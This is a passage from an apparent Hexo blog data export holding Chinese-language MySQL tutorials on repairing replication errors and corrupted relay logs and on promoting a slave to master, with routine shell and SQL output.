class=\"line\"><span class=\"comment\">###   @1=2 /* INT meta=0 nullable=0 is_null=0 */</span></span><br><span class=\"line\"><span class=\"comment\">###   @2=&apos;BTV&apos; /* STRING(4) meta=65028 nullable=1 is_null=0 */</span></span><br><span class=\"line\"><span class=\"comment\"># at 794</span></span><br><span class=\"line\"><span class=\"comment\">#120302 12:08:36 server id 22  end_log_pos 821  Xid = 60</span></span><br><span class=\"line\">COMMIT/*!*/;</span><br><span class=\"line\">DELIMITER ;</span><br><span class=\"line\"><span class=\"comment\"># End of log file</span></span><br><span class=\"line\">ROLLBACK /* added by mysqlbinlog */;</span><br><span class=\"line\">/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5728;slave&#x4E0A;&#xFF0C;&#x67E5;&#x627E;&#x4E0B;&#x66F4;&#x65B0;&#x540E;&#x7684;&#x90A3;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from t1 <span class=\"built_in\">where</span> id=2;</span><br><span class=\"line\">Empty <span class=\"built_in\">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p>\n<p>&#x7136;&#x540E;&#x518D;&#x5230;master&#x67E5;&#x770B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from t1 <span class=\"built_in\">where</span> id=2;</span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">| id | name |</span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">|  2 | BTV  | </span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">1 row <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure></p>\n<p>&#x628A;&#x4E22;&#x5931;&#x7684;&#x6570;&#x636E;&#x5728;slave&#x4E0A;&#x586B;&#x8865;&#xFF0C;&#x7136;&#x540E;&#x8DF3;&#x8FC7;&#x62A5;&#x9519;&#x5373;&#x53EF;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; insert into t1 values (2,<span class=\"string\">&apos;BTV&apos;</span>);</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from t1 <span class=\"built_in\">where</span> id=2;    </span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">| id | name |</span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">|  2 | BTV  | </span><br><span class=\"line\">+----+------+</span><br><span class=\"line\">1 row <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; stop slave ;<span class=\"built_in\">set</span> global sql_slave_skip_counter=1;start slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show slave status\\G;</span><br><span class=\"line\">&#x2026;&#x2026;</span><br><span class=\"line\"> Slave_IO_Running: Yes</span><br><span class=\"line\"> Slave_SQL_Running: Yes</span><br><span class=\"line\">&#x2026;&#x2026;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;\"><a href=\"#&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;\" class=\"headerlink\" title=\"&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;\"></a>&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;</h3><p>slave&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;relay-bin&#x635F;&#x574F;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Last_SQL_Error: Error initializing relay <span class=\"built_in\">log</span> position: I/O error reading the header from the binary <span class=\"built_in\">log</span></span><br><span class=\"line\">Last_SQL_Error: Error initializing relay <span class=\"built_in\">log</span> position: Binlog has bad magic number;  </span><br><span class=\"line\">It<span class=\"string\">&apos;s not a binary log file that can be used by  this version of MySQL</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;\"><a href=\"#1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;\" class=\"headerlink\" title=\"1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;\"></a>1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;</h4><p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;&#x627E;&#x5230;&#x540C;&#x6B65;&#x7684;binlog&#x548C;POS&#x70B9;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x65B0;&#x505A;&#x540C;&#x6B65;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x6709;&#x65B0;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x503C;&#x4E86;&#x3002;</p>\n<p>&#x4F8B;&#x5B50;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show slave status\\G;</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">              Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">          Read_Master_Log_Pos: 1191</span><br><span class=\"line\">               Relay_Log_File: vm02-relay-bin.000005</span><br><span class=\"line\">                Relay_Log_Pos: 253</span><br><span class=\"line\">        Relay_Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">             Slave_IO_Running: Yes</span><br><span class=\"line\">            Slave_SQL_Running: No</span><br><span class=\"line\">              Replicate_Do_DB: </span><br><span class=\"line\">          Replicate_Ignore_DB: </span><br><span class=\"line\">           Replicate_Do_Table: </span><br><span class=\"line\">       Replicate_Ignore_Table: </span><br><span class=\"line\">      Replicate_Wild_Do_Table: </span><br><span class=\"line\">  Replicate_Wild_Ignore_Table: </span><br><span class=\"line\">                   Last_Errno: 1593</span><br><span class=\"line\">                   Last_Error: Error initializing relay <span class=\"built_in\">log</span> position: I/O error reading the header from the binary <span class=\"built_in\">log</span></span><br><span class=\"line\">                 Skip_Counter: 1</span><br><span class=\"line\">          Exec_Master_Log_Pos: 821</span><br><span class=\"line\"></span><br><span class=\"line\">Slave_IO_Running &#xFF1A;&#x63A5;&#x6536;master&#x7684;binlog&#x4FE1;&#x606F;</span><br><span class=\"line\">                   Master_Log_File</span><br><span class=\"line\">                   Read_Master_Log_Pos</span><br><span class=\"line\"></span><br><span class=\"line\">Slave_SQL_Running&#xFF1A;&#x6267;&#x884C;&#x5199;&#x64CD;&#x4F5C;</span><br><span class=\"line\">                   Relay_Master_Log_File</span><br><span class=\"line\">                   Exec_Master_Log_Pos</span><br></pre></td></tr></table></figure></p>\n<p>&#x4EE5;&#x6267;&#x884C;&#x5199;&#x7684;binlog&#x548C;POS&#x70B9;&#x4E3A;&#x51C6;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Relay_Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">Exec_Master_Log_Pos: 821</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; CHANGE MASTER TO MASTER_LOG_FILE=<span class=\"string\">&apos;mysql-bin.000010&apos;</span>,MASTER_LOG_POS=821;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; start slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; show slave status\\G;</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">               Slave_IO_State: Waiting <span class=\"keyword\">for</span> master to send event</span><br><span class=\"line\">                  Master_Host: 192.168.8.22</span><br><span class=\"line\">                  Master_User: repl</span><br><span class=\"line\">                  Master_Port: 3306</span><br><span class=\"line\">                Connect_Retry: 10</span><br><span class=\"line\">              Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">          Read_Master_Log_Pos: 1191</span><br><span class=\"line\">               Relay_Log_File: vm02-relay-bin.000002</span><br><span class=\"line\">                Relay_Log_Pos: 623</span><br><span class=\"line\">        Relay_Master_Log_File: mysql-bin.000010</span><br><span class=\"line\">             Slave_IO_Running: Yes</span><br><span class=\"line\">            Slave_SQL_Running: Yes</span><br><span class=\"line\">              Replicate_Do_DB: </span><br><span class=\"line\">          Replicate_Ignore_DB: </span><br><span class=\"line\">           Replicate_Do_Table: </span><br><span class=\"line\">       Replicate_Ignore_Table: </span><br><span class=\"line\">      Replicate_Wild_Do_Table: </span><br><span class=\"line\">  Replicate_Wild_Ignore_Table: </span><br><span class=\"line\">                   Last_Errno: 0</span><br><span class=\"line\">                   Last_Error: </span><br><span class=\"line\">                 Skip_Counter: 0</span><br><span class=\"line\">          Exec_Master_Log_Pos: 1191</span><br><span class=\"line\">              Relay_Log_Space: 778</span><br><span class=\"line\">              Until_Condition: None</span><br><span class=\"line\">               Until_Log_File: </span><br><span class=\"line\">                Until_Log_Pos: 0</span><br><span class=\"line\">           Master_SSL_Allowed: No</span><br><span class=\"line\">           Master_SSL_CA_File: </span><br><span class=\"line\">           Master_SSL_CA_Path: </span><br><span class=\"line\">              Master_SSL_Cert: </span><br><span class=\"line\">            Master_SSL_Cipher: </span><br><span class=\"line\">               Master_SSL_Key: </span><br><span class=\"line\">        Seconds_Behind_Master: 0</span><br><span class=\"line\">Master_SSL_Verify_Server_Cert: No</span><br><span class=\"line\">                Last_IO_Errno: 0</span><br><span class=\"line\">                Last_IO_Error: </span><br><span class=\"line\">               Last_SQL_Errno: 0</span><br><span class=\"line\">               Last_SQL_Error:</span><br></pre></td></tr></table></figure>\n<h4 id=\"2&#x3001;Ibbackup\"><a href=\"#2&#x3001;Ibbackup\" class=\"headerlink\" title=\"2&#x3001;Ibbackup\"></a>2&#x3001;Ibbackup</h4><p>&#x5404;&#x79CD;&#x5927;&#x62DB;&#x90FD;&#x7528;&#x4E0A;&#x4E86;&#xFF0C;&#x65E0;&#x5948;slave&#x6570;&#x636E;&#x4E22;&#x5931;&#x8FC7;&#x591A;&#xFF0C;ibbackup&#xFF08;&#x9700;&#x8981;&#x94F6;&#x5B50;&#xFF09;&#x8BE5;&#x4F60;&#x767B;&#x573A;&#x4E86;&#x3002;</p>\n<p>Ibbackup&#x70ED;&#x5907;&#x4EFD;&#x5DE5;&#x5177;&#xFF0C;&#x662F;&#x4ED8;&#x8D39;&#x7684;&#x3002;xtrabackup&#x662F;&#x514D;&#x8D39;&#x7684;&#xFF0C;&#x529F;&#x80FD;&#x4E0A;&#x4E00;&#x6837;&#x3002;</p>\n<p>Ibbackup&#x5907;&#x4EFD;&#x671F;&#x95F4;&#x4E0D;&#x9501;&#x8868;&#xFF0C;&#x5907;&#x4EFD;&#x65F6;&#x5F00;&#x542F;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#xFF08;&#x76F8;&#x5F53;&#x4E8E;&#x505A;&#x4E00;&#x4E2A;&#x5FEB;&#x7167;&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x4F1A;&#x8BB0;&#x5F55;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x4E4B;&#x540E;&#x6570;&#x636E;&#x7684;&#x66F4;&#x6539;&#x4FDD;&#x5B58;&#x5728;ibbackup_logfile&#x6587;&#x4EF6;&#x91CC;&#xFF0C;&#x6062;&#x590D;&#x65F6;&#x628A;ibbackup_logfile &#x53D8;&#x5316;&#x7684;&#x6570;&#x636E;&#x518D;&#x5199;&#x5165;&#x5230;ibdata&#x91CC;&#x3002;</p>\n<p>Ibbackup &#x53EA;&#x5907;&#x4EFD;&#x6570;&#x636E;&#xFF08; ibdata&#x3001;.ibd &#xFF09;&#xFF0C;&#x8868;&#x7ED3;&#x6784;.frm&#x4E0D;&#x5907;&#x4EFD;&#x3002;</p>"},{"title":"MySQL主从切换","date":"2016-10-14T14:22:00.000Z","toc":false,"_content":"\n生产环境中，架构很多为一主多从。比如一个主数据库M，两个从数据库S1，S2同时指向主数据库M。\n\n当主服务器M因为意外情况宕机，需要将其中的一个从数据库服务器（假设选择S1）切换成主数据库服务器，同时修改另一个从数据库（S2）的配置，使其指向新的主数据库（S1）。\n\n此外还需要通知应用修改主数据库的IP地址，如果可能，将出现故障的主数据库(M)修复或者重置成新的从数据库。\n通常我们还有其他的方案来实现高可用，比如MHA，MySQL Cluster，MMM，这些暂不讨论。\n\n### 操作步骤\n\n<font style=\"color:red\">1、首先要确保所有的从数据库都已经执行了relay log中的全部更新，在每个从库上，执行stop slave io_thread，停止IO线程，然后检查show processlist的输出，直到看到状态是Slave has read all relay log; waiting for the slave I/O thread to update it，表示更新都执行完毕</font>\n\nS1(从库1操作)：\n```bash\nmysql> stop slave io_thread;\nQuery OK, 0 rows affected (0.06 sec)\n\nmysql> show processlist\\G\n*************************** 1. row ***************************\n     Id: 3\n   User: system user\n   Host: \n     db: NULL\nCommand: Connect\n   Time: 2601\n  State: Slave has read all relay log; waiting for the slave I/O thread to update it\n   Info: NULL\n*************************** 2. row ***************************\n     Id: 4\n   User: root\n   Host: localhost\n     db: NULL\nCommand: Query\n   Time: 0\n  State: NULL\n   Info: show processlist\nrows in set (0.00 sec)\n\nmysql>\n```\n\n<!-- more -->\n\nS2(从库2操作)：\n```bash\nmysql> stop slave io_thread; \nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> show processlist\\G\n*************************** 1. row ***************************\n     Id: 4\n   User: system user\n   Host: \n     db: NULL\nCommand: Connect\n   Time: 2721\n  State: Slave has read all relay log; waiting for the slave I/O thread to update it\n   Info: NULL\n*************************** 2. row ***************************\n     Id: 5\n   User: root\n   Host: localhost\n     db: NULL\nCommand: Query\n   Time: 0\n  State: NULL\n   Info: show processlist\nrows in set (0.00 sec)\n\nmysql>\n```\n\n<font style=\"color:red\">2、在从库S1上，执行stop slave停止从服务，然后执行reset master以重置成主数据库，并且进行授权账号，让S2（从库2）有权限进行连接</font>\n\nS1（从库1操作）：\n\n```bash\nmysql> stop slave;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> reset master;\nQuery OK, 0 rows affected (0.06 sec)\n\nmysql> grant replication slave on *.* to 'repl'@'192.168.0.100' identified by '123456';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql>\n```\n\n<font style=\"color:red\">3、在S2（从库2）上，执行stop slave停止从服务，然后执行change master to master_host='S1'以重新设置主数据库，然后再执行start slave启动复制：</font>\n\nS2（从库2操作）：\n\n```bash\nmysql> stop slave;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> change master to master_host='192.168.0.20';\nQuery OK, 0 rows affected (0.06 sec)\n\nmysql> start slave;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql>\n```\n\n<font style=\"color:red\">4、查看S2（从库2）复制状态是否正常：</font>\n\n```bash\nmysql> show slave status\\G\n*************************** 1. row ***************************\n               Slave_IO_State: Waiting for master to send event\n                  Master_Host: 192.168.0.20\n                  Master_User: repl\n                  Master_Port: 3306\n                Connect_Retry: 2\n              Master_Log_File: mysql-bin.000001\n          Read_Master_Log_Pos: 261\n               Relay_Log_File: MySQL-02-relay-bin.000002\n                Relay_Log_Pos: 407\n        Relay_Master_Log_File: mysql-bin.000001\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n           Replicate_Do_Table: \n       Replicate_Ignore_Table: \n      Replicate_Wild_Do_Table: yayun.%\n  Replicate_Wild_Ignore_Table: \n                   Last_Errno: 0\n                   Last_Error: \n                 Skip_Counter: 0\n          Exec_Master_Log_Pos: 261\n              Relay_Log_Space: 566\n              Until_Condition: None\n               Until_Log_File: \n                Until_Log_Pos: 0\n           Master_SSL_Allowed: No\n           Master_SSL_CA_File: \n           Master_SSL_CA_Path: \n              Master_SSL_Cert: \n            Master_SSL_Cipher: \n               Master_SSL_Key: \n        Seconds_Behind_Master: 0\nMaster_SSL_Verify_Server_Cert: No\n                Last_IO_Errno: 0\n                Last_IO_Error: \n               Last_SQL_Errno: 0\n               Last_SQL_Error: \n  Replicate_Ignore_Server_Ids: \n             Master_Server_Id: 2\nrow in set (0.00 sec)\n\nmysql>\n```\n\n查看原来的从库S1，现在的主库的show processlist情况：\n```bash\nmysql> show  processlist\\G\n*************************** 1. row ***************************\n     Id: 4\n   User: root\n   Host: localhost\n     db: NULL\nCommand: Query\n   Time: 0\n  State: NULL\n   Info: show  processlist\n*************************** 2. row ***************************\n     Id: 7\n   User: repl\n   Host: 192.168.0.100:60235\n     db: NULL\nCommand: Binlog Dump\n   Time: 184\n  State: Master has sent all binlog to slave; waiting for binlog to be updated\n   Info: NULL\nrows in set (0.00 sec)\n\nmysql>\n```\n\n<font style=\"color:red\">5、通知所有的客户端将应用指向S1（已提升为主库）,这样客户端发送的所有的更新变化将记录到S1的二进制日志。</font>\n\n<font style=\"color:red\">6、删除S1（新的主库）服务器上的master.info和relay-log.info文件，否则下次重启时还会按照从库启动。我们也可以设置该参数：</font>\n```bash\nskip_slave_start\n```\n\n7、最后，如果M服务器修复以后，则可以按照S2的方法配置成S1的从库。\n\n\n8、上面的测试步骤中S1默认都是打开log-bin选项的，这样重置成主数据库后可以将二进制日志记录下来，并传送到其他从库，这是提升为主库必须的。其次，S1没有打开log-slave-updates参数，否则重置成主库以后，可能会将已经执行过的二进制日志重复传送给S2，导致S2同步错误。\n\n---\n\n### 相关链接\n\n主从切换脚本参考链接：http://blog.itpub.net/25356953/viewspace-1745534/","source":"_posts/MySQL主从切换.md","raw":"---\ntitle: MySQL主从切换\ntags:\n  - mysql\ncategories:\n  - 运维部署\ndate: 2016-10-14 22:22:00\ntoc: false\n---\n\n生产环境中，架构很多为一主多从。比如一个主数据库M，两个从数据库S1，S2同时指向主数据库M。\n\n当主服务器M因为意外情况宕机，需要将其中的一个从数据库服务器（假设选择S1）切换成主数据库服务器，同时修改另一个从数据库（S2）的配置，使其指向新的主数据库（S1）。\n\n此外还需要通知应用修改主数据库的IP地址，如果可能，将出现故障的主数据库(M)修复或者重置成新的从数据库。\n通常我们还有其他的方案来实现高可用，比如MHA，MySQL Cluster，MMM，这些暂不讨论。\n\n### 操作步骤\n\n<font style=\"color:red\">1、首先要确保所有的从数据库都已经执行了relay log中的全部更新，在每个从库上，执行stop slave io_thread，停止IO线程，然后检查show processlist的输出，直到看到状态是Slave has read all relay log; waiting for the slave I/O thread to update it，表示更新都执行完毕</font>\n\nS1(从库1操作)：\n```bash\nmysql> stop slave io_thread;\nQuery OK, 0 rows affected (0.06 sec)\n\nmysql> show processlist\\G\n*************************** 1. row ***************************\n     Id: 3\n   User: system user\n   Host: \n     db: NULL\nCommand: Connect\n   Time: 2601\n  State: Slave has read all relay log; waiting for the slave I/O thread to update it\n   Info: NULL\n*************************** 2. row ***************************\n     Id: 4\n   User: root\n   Host: localhost\n     db: NULL\nCommand: Query\n   Time: 0\n  State: NULL\n   Info: show processlist\nrows in set (0.00 sec)\n\nmysql>\n```\n\n<!-- more -->\n\nS2(从库2操作)：\n```bash\nmysql> stop slave io_thread; \nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> show processlist\\G\n*************************** 1. row ***************************\n     Id: 4\n   User: system user\n   Host: \n     db: NULL\nCommand: Connect\n   Time: 2721\n  State: Slave has read all relay log; waiting for the slave I/O thread to update it\n   Info: NULL\n*************************** 2. row ***************************\n     Id: 5\n   User: root\n   Host: localhost\n     db: NULL\nCommand: Query\n   Time: 0\n  State: NULL\n   Info: show processlist\nrows in set (0.00 sec)\n\nmysql>\n```\n\n<font style=\"color:red\">2、在从库S1上，执行stop slave停止从服务，然后执行reset master以重置成主数据库，并且进行授权账号，让S2（从库2）有权限进行连接</font>\n\nS1（从库1操作）：\n\n```bash\nmysql> stop slave;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> reset master;\nQuery OK, 0 rows affected (0.06 sec)\n\nmysql> grant replication slave on *.* to 'repl'@'192.168.0.100' identified by '123456';\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql>\n```\n\n<font style=\"color:red\">3、在S2（从库2）上，执行stop slave停止从服务，然后执行change master to master_host='S1'以重新设置主数据库，然后再执行start slave启动复制：</font>\n\nS2（从库2操作）：\n\n```bash\nmysql> stop slave;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> change master to master_host='192.168.0.20';\nQuery OK, 0 rows affected (0.06 sec)\n\nmysql> start slave;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql>\n```\n\n<font style=\"color:red\">4、查看S2（从库2）复制状态是否正常：</font>\n\n```bash\nmysql> show slave status\\G\n*************************** 1. row ***************************\n               Slave_IO_State: Waiting for master to send event\n                  Master_Host: 192.168.0.20\n                  Master_User: repl\n                  Master_Port: 3306\n                Connect_Retry: 2\n              Master_Log_File: mysql-bin.000001\n          Read_Master_Log_Pos: 261\n               Relay_Log_File: MySQL-02-relay-bin.000002\n                Relay_Log_Pos: 407\n        Relay_Master_Log_File: mysql-bin.000001\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n           Replicate_Do_Table: \n       Replicate_Ignore_Table: \n      Replicate_Wild_Do_Table: yayun.%\n  Replicate_Wild_Ignore_Table: \n                   Last_Errno: 0\n                   Last_Error: \n                 Skip_Counter: 0\n          Exec_Master_Log_Pos: 261\n              Relay_Log_Space: 566\n              Until_Condition: None\n               Until_Log_File: \n                Until_Log_Pos: 0\n           Master_SSL_Allowed: No\n           Master_SSL_CA_File: \n           Master_SSL_CA_Path: \n              Master_SSL_Cert: \n            Master_SSL_Cipher: \n               Master_SSL_Key: \n        Seconds_Behind_Master: 0\nMaster_SSL_Verify_Server_Cert: No\n                Last_IO_Errno: 0\n                Last_IO_Error: \n               Last_SQL_Errno: 0\n               Last_SQL_Error: \n  Replicate_Ignore_Server_Ids: \n             Master_Server_Id: 2\nrow in set (0.00 sec)\n\nmysql>\n```\n\n查看原来的从库S1，现在的主库的show processlist情况：\n```bash\nmysql> show  processlist\\G\n*************************** 1. row ***************************\n     Id: 4\n   User: root\n   Host: localhost\n     db: NULL\nCommand: Query\n   Time: 0\n  State: NULL\n   Info: show  processlist\n*************************** 2. row ***************************\n     Id: 7\n   User: repl\n   Host: 192.168.0.100:60235\n     db: NULL\nCommand: Binlog Dump\n   Time: 184\n  State: Master has sent all binlog to slave; waiting for binlog to be updated\n   Info: NULL\nrows in set (0.00 sec)\n\nmysql>\n```\n\n<font style=\"color:red\">5、通知所有的客户端将应用指向S1（已提升为主库）,这样客户端发送的所有的更新变化将记录到S1的二进制日志。</font>\n\n<font style=\"color:red\">6、删除S1（新的主库）服务器上的master.info和relay-log.info文件，否则下次重启时还会按照从库启动。我们也可以设置该参数：</font>\n```bash\nskip_slave_start\n```\n\n7、最后，如果M服务器修复以后，则可以按照S2的方法配置成S1的从库。\n\n\n8、上面的测试步骤中S1默认都是打开log-bin选项的，这样重置成主数据库后可以将二进制日志记录下来，并传送到其他从库，这是提升为主库必须的。其次，S1没有打开log-slave-updates参数，否则重置成主库以后，可能会将已经执行过的二进制日志重复传送给S2，导致S2同步错误。\n\n---\n\n### 相关链接\n\n主从切换脚本参考链接：http://blog.itpub.net/25356953/viewspace-1745534/","slug":"MySQL主从切换","published":1,"updated":"2016-11-17T11:59:42.666Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbr001qgwtmdxksm6kc","content":"<p>&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x67B6;&#x6784;&#x5F88;&#x591A;&#x4E3A;&#x4E00;&#x4E3B;&#x591A;&#x4ECE;&#x3002;&#x6BD4;&#x5982;&#x4E00;&#x4E2A;&#x4E3B;&#x6570;&#x636E;&#x5E93;M&#xFF0C;&#x4E24;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;S1&#xFF0C;S2&#x540C;&#x65F6;&#x6307;&#x5411;&#x4E3B;&#x6570;&#x636E;&#x5E93;M&#x3002;</p>\n<p>&#x5F53;&#x4E3B;&#x670D;&#x52A1;&#x5668;M&#x56E0;&#x4E3A;&#x610F;&#x5916;&#x60C5;&#x51B5;&#x5B95;&#x673A;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x5047;&#x8BBE;&#x9009;&#x62E9;S1&#xFF09;&#x5207;&#x6362;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x540C;&#x65F6;&#x4FEE;&#x6539;&#x53E6;&#x4E00;&#x4E2A;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#xFF08;S2&#xFF09;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4F7F;&#x5176;&#x6307;&#x5411;&#x65B0;&#x7684;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF08;S1&#xFF09;&#x3002;</p>\n<p>&#x6B64;&#x5916;&#x8FD8;&#x9700;&#x8981;&#x901A;&#x77E5;&#x5E94;&#x7528;&#x4FEE;&#x6539;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x80FD;&#xFF0C;&#x5C06;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x7684;&#x4E3B;&#x6570;&#x636E;&#x5E93;(M)&#x4FEE;&#x590D;&#x6216;&#x8005;&#x91CD;&#x7F6E;